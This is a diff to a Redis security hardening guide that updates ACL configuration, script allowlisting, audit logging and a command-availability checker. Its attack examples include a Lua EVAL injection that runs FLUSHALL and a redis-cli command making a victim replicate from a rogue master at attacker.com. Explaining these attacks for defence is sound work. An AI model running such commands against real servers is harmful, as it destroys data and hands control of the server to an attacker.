@@ -69,7 +69,9 @@ SAVE
 
 ### Protection Measures
 
-```bash
+```conf
+# redis.conf
+
 # 1. Enable authentication
 requirepass YourVeryStrongPassword123!@#
 
@@ -79,14 +81,17 @@ bind 127.0.0.1
 # 3. Enable protected mode
 protected-mode yes
 
-# 4. Disable CONFIG command
+# 4. Use ACLs to restrict commands
+user default off
+user app on >password ~* +@all -config -debug -shutdown
+
+# 5. Legacy command shadowing
+# rename-command is deprecated in Redis 7+; prefer ACLs when possible.
 rename-command CONFIG ""
+```
 
-# 5. Use ACLs to restrict commands
-ACL SETUSER default off
-ACL SETUSER app on >password ~* +@all -config -debug -shutdown
-
-# 6. Firewall rules
+```bash
+# 6. Firewall rules (run in your shell)
 iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
 iptables -A INPUT -p tcp --dport 6379 -j DROP
 ```
@@ -159,26 +164,31 @@ if result['exposed']:
 ### Lua Script Injection
 
 ```bash
-# Dangerous: Untrusted input in EVAL
-EVAL "return redis.call('GET', KEYS[1])" 1 user_input
+# Dangerous pattern in application code:
+# script = "redis.call('GET', '" + user_key + "')"
+# Attacker key: "x'); redis.call('FLUSHALL'); --"
+EVAL "redis.call('GET', 'x'); redis.call('FLUSHALL'); --')" 0
 
-# Attacker input: "'; redis.call('FLUSHALL'); --"
+# Safer: pass untrusted key names and values through KEYS/ARGV
+EVAL "return redis.call('GET', KEYS[1])" 1 user_input
 ```
 
-### Key Name Injection
+### Key Namespace Abuse
 
 ```python
 # Vulnerable code
 def get_user_data(user_id):
     return redis.get(f"user:{user_id}:data")
 
-# Attacker provides: "../../../etc/passwd"
-# Or uses special characters to manipulate commands
+# Attacker provides a value that escapes the expected application namespace
+# or creates oversized/unexpected keys, even though high-level Redis clients
+# encode key names safely as command arguments.
 ```
 
 ### Protection Measures
 
 ```python
+import hashlib
 import re
 
 class SafeRedisClient:
@@ -213,8 +223,8 @@ class SafeRedisClient:
         """
         # Only allow pre-approved script hashes
         allowed_scripts = {
-            'abc123...': 'increment_with_limit',
-            'def456...': 'atomic_transfer',
+            hashlib.sha1(b"return redis.call('INCR', KEYS[1])").hexdigest(): 'increment',
+            hashlib.sha1(b"return redis.call('GET', KEYS[1])").hexdigest(): 'get',
         }
 
         script_hash = hashlib.sha1(script.encode()).hexdigest()
@@ -225,6 +235,9 @@ class SafeRedisClient:
         for key in keys:
             if not self.validate_key(key):
                 raise ValueError(f"Invalid key in script: {key}")
+
+        if not self.redis.script_exists(script_hash)[0]:
+            self.redis.script_load(script)
 
         return self.redis.evalsha(script_hash, len(keys), *keys, *args)
 
@@ -244,8 +257,9 @@ except ValueError as e:
 
 ### Disable Dangerous Commands
 
-```bash
-# redis.conf
+```conf
+# redis.conf (legacy command shadowing)
+# rename-command is deprecated in Redis 7+; prefer ACLs when possible.
 rename-command EVAL ""
 rename-command EVALSHA ""
 rename-command SCRIPT ""
@@ -426,12 +440,15 @@ class ProtectedRedisClient:
 
 - Unauthorized data access
 - Database dumps
-- Replication hijacking (SLAVEOF attack)
+- Replication hijacking (REPLICAOF/SLAVEOF attack)
 
-### SLAVEOF Attack
+### REPLICAOF / SLAVEOF Attack
 
 ```bash
 # Attacker sets up rogue master and makes victim replicate from it
+redis-cli -h victim.com REPLICAOF attacker.com 6379
+
+# Older Redis versions used SLAVEOF, which is deprecated as of Redis 5.0
 redis-cli -h victim.com SLAVEOF attacker.com 6379
 ```
 
@@ -442,11 +459,12 @@ redis-cli -h victim.com SLAVEOF attacker.com 6379
 rename-command SLAVEOF ""
 rename-command REPLICAOF ""
 
-# If using replication, set master auth
-masterauth your-master-password
+# redis.conf on replicas: set master user and auth
+masteruser replica
+masterauth replica-pass
 
-# Use ACLs to restrict replication
-ACL SETUSER replica on >replica-pass +psync +replconf +ping
+# redis-cli on the master: restrict the replication user
+redis-cli ACL SETUSER replica on '>replica-pass' +psync +replconf +ping
 ```
 
 ### Data Access Logging
@@ -454,8 +472,7 @@ ACL SETUSER replica on >replica-pass +psync +replconf +ping
 ```python
 import redis
 import logging
-from datetime import datetime
-from functools import wraps
+from datetime import datetime, timezone
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger('redis_audit')
@@ -478,7 +495,7 @@ class AuditedRedisClient:
                     extra: dict = None):
         """Log data access."""
         log_entry = {
-            'timestamp': datetime.utcnow().isoformat(),
+            'timestamp': datetime.now(timezone.utc).isoformat(),
             'user_id': self.user_id,
             'operation': operation,
             'key': key,
@@ -624,25 +641,28 @@ class RedisSecurityChecker:
 
         for cmd in dangerous_cmds:
             try:
-                if cmd == 'CONFIG':
-                    r.config_get('maxmemory')
+                info = r.execute_command('COMMAND', 'INFO', cmd)
+                if isinstance(info, dict):
+                    available = bool(info.get(cmd.lower()) or info.get(cmd.upper()))
+                else:
+                    available = bool(info and info[0])
+
+                if available:
+                    severity = 'medium' if cmd == 'KEYS' else 'high'
                     self._add_check(
                         f'Command {cmd}',
                         False,
                         f'{cmd} command is available',
-                        'high'
+                        severity
                     )
-                elif cmd == 'KEYS':
-                    r.keys('__nonexistent__')
-                    self._add_check(
-                        f'Command {cmd}',
-                        False,
-                        f'{cmd} command is available',
-                        'medium'
-                    )
-            except redis.ResponseError as e:
-                if 'unknown command' in str(e).lower():
+                else:
                     self._add_check(f'Command {cmd}', True, f'{cmd} is disabled')
+            except redis.ResponseError as e:
+                message = str(e).lower()
+                if 'unknown command' in message:
+                    self._add_check(f'Command {cmd}', True, f'{cmd} is disabled')
+                elif 'noperm' in message:
+                    self._add_check(f'Command {cmd}', True, f'{cmd} is blocked by ACL')
 
     def _check_protected_mode(self):
         """Check protected mode setting."""
